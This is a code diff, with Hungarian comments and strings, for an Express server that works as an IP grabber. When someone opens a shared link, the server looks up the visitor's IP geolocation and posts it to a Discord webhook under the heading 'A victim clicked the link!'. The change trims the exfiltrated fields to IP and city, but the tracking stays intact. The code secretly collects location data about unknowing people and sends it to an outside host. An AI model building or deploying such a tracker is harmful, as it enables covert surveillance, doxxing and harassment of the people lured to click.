@@ -2,7 +2,7 @@
 
 const express = require('express');
 const axios = require('axios');
-require('dotenv').config(); // Környezeti változók betöltése
+require('dotenv').config();
 const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
@@ -27,28 +27,19 @@ app.get('/send-ip', async (req, res) => {
         const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
         const geoData = geoResponse.data;
 
-        const [latitude, longitude] = (geoData.loc || '0,0').split(',');
-
         const message = {
             username: "Helyszíni Naplózó <3",
             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
             content: `<@1095731086513930260>`,
             embeds: [{
                 title: "Egy áldozat rákattintott a linkre!",
-                description: `**IP-cím >>** ${userIp}
-**Hálózat >>** ${geoData.org || 'N/A'}
-**Város >>** ${geoData.city || 'N/A'}
-**Régió >>** ${geoData.region || 'N/A'}
-**Ország >>** ${geoData.country || 'N/A'}
-**Irányítószám >>** ${geoData.postal || 'N/A'}
-**Szélesség >>** ${latitude}
-**Hosszúság >>** ${longitude}`,
+                description: `**IP-cím >>** ${userIp}\n**Város >>** ${geoData.city || 'N/A'}`,
                 color: 0x800080
             }]
         };
 
         await axios.post(webhookUrl, message);
-        res.send('IP és helyadatok sikeresen elküldve Discordra!');
+        res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
     } catch (error) {
         console.error('Hiba:', error.message);
         res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
